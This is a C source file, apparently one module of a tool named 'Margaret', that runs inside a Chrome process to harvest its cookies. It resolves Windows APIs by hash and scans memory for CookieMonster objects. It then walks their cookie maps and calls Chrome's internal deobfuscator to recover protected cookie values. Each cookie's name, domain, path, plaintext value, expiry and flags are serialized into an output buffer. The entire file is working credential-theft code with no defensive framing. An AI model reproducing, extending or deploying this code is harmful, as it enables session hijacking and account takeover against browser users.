#define CODE_SECTION_NAME ".text$F"
#include "margaret.h"
#include "chromium_adapter.h"
#include "cc_layout.h"
#include "resolve.h"

/* Bounded CookieMonster discovery, traversal, and serialization. */

typedef DWORD (MS_ABI *PGET_TICK_COUNT_FN)(void);

/* Bounded output writers. */

static CODE_SECTION BOOL EngineAWriteBytes(PBYTE*cursor,
                                               PDWORD remaining,
                                               const BYTE *source,
                                               DWORD length)
{
    if (*remaining < length) {
        return FALSE;
    }
    for (DWORD i = 0u; i < length; ++i) {
        (*cursor)[i] = source[i];
    }
    *cursor += length;
    *remaining -= length;
    return TRUE;
}

static CODE_SECTION BOOL EngineAWriteU32(PBYTE*cursor,
                                             PDWORD remaining,
                                             DWORD value)
{
    if (*remaining < 4u) {
        return FALSE;
    }
    (*cursor)[0] = (BYTE)(value & 0xFFu);
    (*cursor)[1] = (BYTE)((value >> 8u) & 0xFFu);
    (*cursor)[2] = (BYTE)((value >> 16u) & 0xFFu);
    (*cursor)[3] = (BYTE)((value >> 24u) & 0xFFu);
    *cursor += 4u;
    *remaining -= 4u;
    return TRUE;
}

/* CookieMonster tree walk. */

/* Whole-snapshot cookie cap. */
#define MARGARET_MAX_COOKIES_TOTAL 4096u
/* Per-map cookie cap. */
#define MARGARET_MAX_COOKIES_PER_INSTANCE 4096u
#define MARGARET_MAX_TREE_DEPTH 64u
/* Candidate-instance cap; the caller timeout bounds scanning. */
#define MARGARET_MAX_INSTANCES 4096u

/* Require each cookie vtable to point inside chrome.dll. */
static CODE_SECTION BOOL EngineACookieValid(const BYTE *cookie,
                                                ULONG_PTR chromeBase,
                                                ULONG_PTR chromeSize)
{
    ULONG_PTR vtable;
    if (!CcPtrPlausible((ULONG_PTR)cookie)) {
        return FALSE;
    }
    vtable = (ULONG_PTR)CcReadU64(cookie);
    return vtable >= chromeBase && vtable < chromeBase + chromeSize;
}

/* libc++ tree successor; links are left, right, and parent. */
static CODE_SECTION ULONG_PTR EngineATreeNext(const BYTE *node,
                                             ULONG_PTR endSentinel)
{
    ULONG_PTR right;
    ULONG_PTR current;
    ULONG_PTR parent;
    DWORD depth;

    right = (ULONG_PTR)CcReadU64(node + 0x08);
    if (right != 0u) {
        /* Leftmost node of the right subtree. */
        if (!CcPtrPlausible(right)) {
            return 0u; /* Malformed tree. */
        }
        current = right;
        for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
            ULONG_PTR left = (ULONG_PTR)CcReadU64((const BYTE *)current);
            if (left == 0u) {
                return current;
            }
            if (!CcPtrPlausible(left)) {
                return 0u; /* Malformed tree. */
            }
            current = left;
        }
        return 0u; /* Depth exceeded. */
    }

    /* Ascend until leaving a left subtree. */
    current = (ULONG_PTR)node;
    for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
        parent = (ULONG_PTR)CcReadU64((const BYTE *)current + 0x10);
        if (parent == 0u || parent == endSentinel) {
            return 0u;
        }
        if (!CcPtrPlausible(parent)) {
            return 0u; /* Malformed tree. */
        }
        {
            ULONG_PTR parentLeft =
                (ULONG_PTR)CcReadU64((const BYTE *)parent);
            /* The first ancestor reached from its left child is next. */
            if (parentLeft == current) {
                return parent;
            }
        }
        current = parent;
    }
    return 0u; /* Depth exceeded. */
}

/* Cookie serialization. */

/* Serialize one complete cookie in the format declared by margaret.h. */
#define MARGARET_CC_FIXED_BYTES 32u /* Fixed fields after value. */

typedef void (MS_ABI *PCOOKIE_VALUE_FN)(PVOID out, PVOID cookie);

static CODE_SECTION BOOL EngineASerializeCookie(
    const BYTE *cookie,
    PBYTE*cursor,
    PDWORD remaining,
    const BYTE *chromeBase,
    ULONG_PTR deobfFn,
    const CC_LAYOUT *lay,
    FLAGS_CAL *flagsCal)
{
    CC_STRING_VIEW name;
    CC_STRING_VIEW domain;
    CC_STRING_VIEW path;
    CC_STRING_VIEW value;
    DWORD total;

    if (cookie == NULL || lay == NULL ||
        lay->Calibrated != 1u) {
        return FALSE;
    }

    /* Read calibrated string fields. */
    if (!CcReadString(cookie + lay->OffName, &name) ||
        !CcReadString(cookie + lay->OffDomain, &domain) ||
        !CcReadString(cookie + lay->OffPath, &path)) {
        return FALSE;
    }

    /* De-obfuscate the ProcessBound value through its direct accessor. */
    value.Data = NULL;
    value.Length = 0u;
    if (deobfFn != 0u && chromeBase != NULL &&
        cookie[lay->OffFlag] == 1u) {
        BYTE out[24];
        (void)MargaretMemzero(out, sizeof(out));
        ((PCOOKIE_VALUE_FN)deobfFn)((PVOID)(cookie + lay->OffValue),
                                        out);
        (void)CcReadString(out, &value);
    }

    /* Reject partial-cookie writes. */
    total = 16u + name.Length + domain.Length + path.Length + value.Length +
            MARGARET_CC_FIXED_BYTES;
    if (*remaining < total) {
        return FALSE;
    }

    /* Write lengths followed by bytes. */
    if (!EngineAWriteU32(cursor, remaining, name.Length) ||
        !EngineAWriteBytes(cursor, remaining, name.Data, name.Length) ||
        !EngineAWriteU32(cursor, remaining, domain.Length) ||
        !EngineAWriteBytes(cursor, remaining, domain.Data, domain.Length) ||
        !EngineAWriteU32(cursor, remaining, path.Length) ||
        !EngineAWriteBytes(cursor, remaining, path.Data, path.Length) ||
        !EngineAWriteU32(cursor, remaining, value.Length) ||
        !EngineAWriteBytes(cursor, remaining, value.Data, value.Length)) {
        return FALSE;
    }

    /* Write calibrated creation and expiry times. */
    {
        BYTE timeBuf[8];
        ULONGLONG t = CcReadU64(cookie + lay->OffCreation);
        for (DWORD i = 0u; i < 8u; ++i) {
            timeBuf[i] = (BYTE)((t >> (i * 8u)) & 0xFFu);
        }
        if (!EngineAWriteBytes(cursor, remaining, timeBuf, 8u)) {
            return FALSE;
        }
        t = CcReadU64(cookie + lay->OffExpiry);
        for (DWORD i = 0u; i < 8u; ++i) {
            timeBuf[i] = (BYTE)((t >> (i * 8u)) & 0xFFu);
        }
        if (!EngineAWriteBytes(cursor, remaining, timeBuf, 8u)) {
            return FALSE;
        }
    }

    /* Refine and emit secure/httponly flags. */
    MargaretCcFlagsUpdate(flagsCal, cookie,
                              name.Data, name.Length);
    if (!EngineAWriteU32(cursor, remaining,
                            MargaretCcFlagsRead(flagsCal, cookie))) {
        return FALSE;
    }

    /* Emit validated same-site and port fields, or zero. */
    if (!EngineAWriteU32(cursor, remaining,
                            lay->OffSameSite != 0u
                                ? CcReadU32(cookie + lay->OffSameSite)
                                : 0u) ||
        !EngineAWriteU32(cursor, remaining,
                            lay->OffPort != 0u
                                ? CcReadU32(cookie + lay->OffPort)
                                : 0u)) {
        return FALSE;
    }

    return TRUE;
}

/* Discover, walk, and serialize. */

CODE_SECTION DWORD MS_ABI MargaretEngineASnapshot(
    RESOLVER_CONTEXT *ctx,
    const MARGARET_CHROMIUM_ADAPTER *adapter,
    MARGARET_ARGS *args)
{
    PVOID kernel32Base;
    PVIRTUAL_QUERY_FN virtualQuery;
    PGET_TICK_COUNT_FN getTickCount;
    PBYTE cursor;
    DWORD remaining;
    DWORD cookieCount;
    DWORD instanceCount;
    DWORD status;
    ULONG_PTR scanEndAddr;
    ULONG_PTR lastHitAddr;
    FLAGS_CAL flagsCal;
    CC_LAYOUT ccLayout;
    const BYTE *calSample[CAL_SAMPLE_MAX];
    DWORD calN;
    DWORD calDiag;
    BYTE layoutFailed;
    ULONG_PTR deobfFn;
    const BYTE *chromeBase;
    DWORD chromeSize;

    if (ctx == NULL || adapter == NULL || args == NULL) {
        return (DWORD)MargaretStatusBadArgument;
    }
    if (args->OutputBuffer == NULL || args->OutputCapacity < 32u) {
        args->OutputLength = 32u;
        args->Status = (DWORD)MargaretStatusBufferTooSmall;
        return (DWORD)MargaretStatusBufferTooSmall;
    }

    /* Resolve VirtualQuery. */
    {
        API_HASH k32 = MARGARET_MODULE_HASH_KERNEL32_DLL;
        API_HASH vq = MARGARET_HASH_VIRTUALQUERY;
        API_HASH gtc = MARGARET_HASH_GETTICKCOUNT;
        if (FindModule(ctx, &k32, &kernel32Base) !=
            ResolveStatusOk) {
            ctx->LastError = (DWORD)ResolveStatusModuleNotFound;
            args->Status = (DWORD)MargaretStatusInternalError;
            return (DWORD)MargaretStatusInternalError;
        }
        if (ResolveExport(ctx, kernel32Base, &vq,
                               (PVOID*)&virtualQuery) != ResolveStatusOk) {
            ctx->LastError = (DWORD)ResolveStatusExportNotFound;
            args->Status = (DWORD)MargaretStatusInternalError;
            return (DWORD)MargaretStatusInternalError;
        }
        if (ResolveExport(ctx, kernel32Base, &gtc,
                               (PVOID*)&getTickCount) != ResolveStatusOk) {
            ctx->LastError = (DWORD)ResolveStatusExportNotFound;
            args->Status = (DWORD)MargaretStatusInternalError;
            return (DWORD)MargaretStatusInternalError;
        }
    }

    scanEndAddr = 0u;
    lastHitAddr = 0u;
    cursor = (PBYTE)args->OutputBuffer;
    remaining = args->OutputCapacity;

    /* Write the fixed 32-byte header. */
    if (!EngineAWriteU32(&cursor, &remaining, MARGARET_ENGINE_A_MAGIC)) {
        args->Status = (DWORD)MargaretStatusBufferTooSmall;
        return (DWORD)MargaretStatusBufferTooSmall;
    }
    /* Reserve count and scan-diagnostic fields. */
    if (!EngineAWriteU32(&cursor, &remaining, 0u) ||
        !EngineAWriteU32(&cursor, &remaining, 0u) ||
        !EngineAWriteU32(&cursor, &remaining, 0u) ||
        !EngineAWriteU32(&cursor, &remaining, 0u) ||
        !EngineAWriteU32(&cursor, &remaining, 0u) ||
        !EngineAWriteU32(&cursor, &remaining, 0u) ||
        !EngineAWriteU32(&cursor, &remaining, 0u)) {
        args->Status = (DWORD)MargaretStatusBufferTooSmall;
        return (DWORD)MargaretStatusBufferTooSmall;
    }

    cookieCount = 0u;
    instanceCount = 0u;
    {
        FLAGS_CAL flagsCalInit;
        flagsCalInit.Candidates = FLAGS_ALL_CAND;
        flagsCalInit.WindowBase = 0u;
        flagsCalInit.Calibrated = 0u;
        flagsCalInit.SecureOff = 0u;
        flagsCal = flagsCalInit;
    }
    (void)MargaretMemzero(&ccLayout, sizeof(ccLayout));
    calN = 0u;
    calDiag = 0u;
    layoutFailed = 0u;
    status = (DWORD)MargaretStatusOk;

    /* Locate chrome.dll. */
    {
        if (!MargaretLocateChromeDll(ctx, (PVOID*)&chromeBase,
                                        &chromeSize)) {
            args->Status = (DWORD)MargaretStatusUnsupportedBuild;
            return (DWORD)MargaretStatusUnsupportedBuild;
        }
        args->Flags = 20u; /* Module located. */

        deobfFn = 0u;
        if (adapter->RvaCanonicalCookieDeobfuscator != 0u) {
            deobfFn = (ULONG_PTR)chromeBase +
                       adapter->RvaCanonicalCookieDeobfuscator;
        }

        /* Compute the relocated vtable address. */
        {
            const BYTE *vtablePtr =
                chromeBase + adapter->RvaCookieMonsterVtable;
            ULONGLONG vtableVa = (ULONGLONG)(ULONG_PTR)vtablePtr;

            /* Scan committed memory for CookieMonster instances. */
            MEMORY_BASIC_INFORMATION mbi;
            /* Scan the full user range; candidate walks reject stray hits. */
            ULONG_PTR address = 0x10000u;
            /* Check timeout between regions; each region is capped below. */
            BOOL stop = FALSE;
            DWORD startTicks = getTickCount();
            DWORD timeoutMs = args->TimeoutMs;
            while (!stop &&
                   instanceCount < MARGARET_MAX_INSTANCES &&
                   cookieCount < MARGARET_MAX_COOKIES_TOTAL &&
                   (timeoutMs == 0u ||
                    (DWORD)(getTickCount() - startTicks) <= timeoutMs)) {
                ULONG_PTR regionSize;

                if (virtualQuery((PCVOID)address, &mbi,
                                   sizeof(mbi)) == 0u) {
                    break;
                }
                regionSize = mbi.RegionSize;
                if (regionSize == 0u) {
                    break;
                }

                {
                    DWORD mbiState = CcReadU32(
                        (const BYTE *)&mbi + MBI_OFF_STATE);
                    DWORD mbiProtect = CcReadU32(
                        (const BYTE *)&mbi + MBI_OFF_PROTECT);
                    if (mbiState == MEM_COMMIT &&
                        (mbiProtect & 0xEEu) != 0u && /* Readable or executable. */
                        (mbiProtect & PAGE_GUARD) == 0u) {
                        /* Scan this region for the vtable address. */
                        const BYTE *region =
                            (const BYTE *)mbi.BaseAddress;
                        /* Clamp RegionSize before narrowing to 32 bits. */
                        DWORD regionU32;

                        if (regionSize > 256u * 1024u * 1024u) {
                            regionU32 = 256u * 1024u * 1024u;
                        } else {
                            regionU32 = (DWORD)regionSize;
                        }

                    /* Scan aligned qwords. */
                    for (DWORD offset = 0u;
                         !stop &&
                         offset + 8u <= regionU32 &&
                         instanceCount < MARGARET_MAX_INSTANCES;
                         offset += 8u) {
                        if (CcReadU64(region + offset) == vtableVa) {
                            ULONG_PTR instanceAddr =
                                (ULONG_PTR)(region + offset);

                            /* Ignore pointers inside chrome.dll. */
                            if (instanceAddr >= (ULONG_PTR)chromeBase &&
                                instanceAddr < (ULONG_PTR)chromeBase + chromeSize) {
                                continue;
                            }

                            /* Validate this candidate through its map walk. */
                            instanceCount++;
                            lastHitAddr = instanceAddr;

                            /* Walk the cookie map. */
                            {
                                const BYTE *cm = (const BYTE *)instanceAddr;
                                MEMORY_BASIC_INFORMATION vetMbi;
                                ULONG_PTR node = CcReadU64(cm + 0x30);
                                ULONG_PTR endAddr =
                                    (ULONG_PTR)(cm + 0x38);
                                DWORD nodeCount = 0u;

                                /* Vet the first node before dereferencing it. */
                                if (node != 0u && node != endAddr &&
                                    !CcRegionOk(
                                        (PCVOID)node, &vetMbi,
                                        virtualQuery)) {
                                    node = 0u;
                                }

                                while (!stop &&
                                       node != 0u &&
                                       node != endAddr &&
                                       nodeCount < MARGARET_MAX_COOKIES_PER_INSTANCE) {
                                    const BYTE *cookie;
                                    ULONG_PTR nextNode;

                                    /* Validate each node pointer. */
                                    if (!CcPtrPlausible(node)) {
                                        break;
                                    }
                                    cookie = (const BYTE *)CcReadU64(
                                        (const BYTE *)node + 0x38);

                                    /* Compute next before validating the cookie. */
                                    nextNode = EngineATreeNext(
                                        (const BYTE *)node, endAddr);

                                    /* Skip invalid cookies; keep walking the map. */
                                    if (CcRegionOk(
                                            (PCVOID)cookie, &vetMbi,
                                            virtualQuery) &&
                                        EngineACookieValid(
                                            cookie, (ULONG_PTR)chromeBase,
                                            chromeSize)) {
                                        if (ccLayout.Calibrated != 0u) {
                                            if (EngineASerializeCookie(
                                                    cookie, &cursor,
                                                    &remaining,
                                                    chromeBase,
                                                    deobfFn,
                                                    &ccLayout,
                                                    &flagsCal)) {
                                                cookieCount++;
                                            } else {
                                                /* Output full. */
                                                status = (DWORD)MargaretStatusBufferTooSmall;
                                                stop = TRUE;
                                            }
                                        } else if (layoutFailed == 0u &&
                                                   calN < CAL_SAMPLE_MAX) {
                                            /* Grow the calibration sample. */
                                            calSample[calN] = cookie;
                                            calN++;
                                            if (calN >= CAL_SAMPLE_MIN &&
                                                MargaretCcCalibrate(
                                                    calSample, calN,
                                                    virtualQuery,
                                                    &ccLayout,
                                                    &calDiag)) {
                                                flagsCal.WindowBase =
                                                    ccLayout.OffFlag + 8u;
                                                args->Pad = 0xB1u;
                                                /* Flush sampled cookies. */
                                                {
                                                    DWORD fi;
                                                    for (fi = 0u;
                                                         fi < calN &&
                                                         stop == FALSE;
                                                         ++fi) {
                                                        if (EngineASerializeCookie(
                                                                calSample[fi],
                                                                &cursor,
                                                                &remaining,
                                                                chromeBase,
                                                                deobfFn,
                                                                &ccLayout,
                                                                &flagsCal)) {
                                                            cookieCount++;
                                                        } else {
                                                            status = (DWORD)MargaretStatusBufferTooSmall;
                                                            stop = TRUE;
                                                        }
                                                    }
                                                }
                                            } else if (calN == CAL_SAMPLE_MAX) {
                                                /* Preserve raw samples after calibration failure. */
                                                layoutFailed = 1u;
                                                args->Pad = 0xA0u + calDiag;
                                                (void)EngineAWriteBytes(
                                                    &cursor, &remaining,
                                                    calSample[0], 0x110u);
                                                (void)EngineAWriteBytes(
                                                    &cursor, &remaining,
                                                    calSample[1], 0x110u);
                                                status = (DWORD)MargaretStatusUnsupportedBuild;
                                                stop = TRUE;
                                            }
                                        }
                                    }
                                    nodeCount++;
                                    node = nextNode;
                                }
                            }
                        }
                    }
                    }
                }

                address = (ULONG_PTR)mbi.BaseAddress + regionSize;
                if (address < (ULONG_PTR)mbi.BaseAddress) {
                    break; /* Overflow. */
                }
            }
            scanEndAddr = address;
        }
    }

    /* Final calibration attempt for small jars; unproven layouts fail closed. */
    if (ccLayout.Calibrated == 0u && layoutFailed == 0u) {
        if (calN >= CAL_SAMPLE_MIN &&
            MargaretCcCalibrate(calSample, calN, virtualQuery,
                                      &ccLayout, &calDiag)) {
            flagsCal.WindowBase = ccLayout.OffFlag + 8u;
            args->Pad = 0xB0u;
            {
                DWORD fi;
                for (fi = 0u; fi < calN; ++fi) {
                    if (EngineASerializeCookie(
                            calSample[fi], &cursor, &remaining,
                            chromeBase, deobfFn, &ccLayout,
                            &flagsCal)) {
                        cookieCount++;
                    } else {
                        status = (DWORD)MargaretStatusBufferTooSmall;
                        break;
                    }
                }
            }
        } else {
            args->Pad = (calN < CAL_SAMPLE_MIN) ? 0x9Fu : (0xA0u + calDiag);
            if (calN >= 2u) {
                (void)EngineAWriteBytes(&cursor, &remaining,
                                           calSample[0], 0x110u);
                (void)EngineAWriteBytes(&cursor, &remaining,
                                           calSample[1], 0x110u);
            }
            status = (DWORD)MargaretStatusUnsupportedBuild;
        }
    }

    args->Flags = 30u; /* Scan complete. */
    /* Patch counts into the header. */
    {
        PBYTE header = (PBYTE)args->OutputBuffer;
        header[4] = (BYTE)(cookieCount & 0xFFu);
        header[5] = (BYTE)((cookieCount >> 8u) & 0xFFu);
        header[6] = (BYTE)((cookieCount >> 16u) & 0xFFu);
        header[7] = (BYTE)((cookieCount >> 24u) & 0xFFu);
        header[8] = (BYTE)(instanceCount & 0xFFu);
        header[9] = (BYTE)((instanceCount >> 8u) & 0xFFu);
        header[10] = (BYTE)((instanceCount >> 16u) & 0xFFu);
        header[11] = (BYTE)((instanceCount >> 24u) & 0xFFu);
        /* Patch scan diagnostics. */
        header[12] = (BYTE)(scanEndAddr & 0xFFu);
        header[13] = (BYTE)((scanEndAddr >> 8u) & 0xFFu);
        header[14] = (BYTE)((scanEndAddr >> 16u) & 0xFFu);
        header[15] = (BYTE)((scanEndAddr >> 24u) & 0xFFu);
        header[16] = (BYTE)((scanEndAddr >> 32u) & 0xFFu);
        header[17] = (BYTE)((scanEndAddr >> 40u) & 0xFFu);
        header[18] = (BYTE)((scanEndAddr >> 48u) & 0xFFu);
        header[19] = (BYTE)((scanEndAddr >> 56u) & 0xFFu);
        header[20] = (BYTE)(lastHitAddr & 0xFFu);
        header[21] = (BYTE)((lastHitAddr >> 8u) & 0xFFu);
        header[22] = (BYTE)((lastHitAddr >> 16u) & 0xFFu);
        header[23] = (BYTE)((lastHitAddr >> 24u) & 0xFFu);
        header[24] = (BYTE)((lastHitAddr >> 32u) & 0xFFu);
        header[25] = (BYTE)((lastHitAddr >> 40u) & 0xFFu);
        header[26] = (BYTE)((lastHitAddr >> 48u) & 0xFFu);
        header[27] = (BYTE)((lastHitAddr >> 56u) & 0xFFu);
    }

    args->OutputLength = args->OutputCapacity - remaining;
    args->Status = status;
    return status;
}
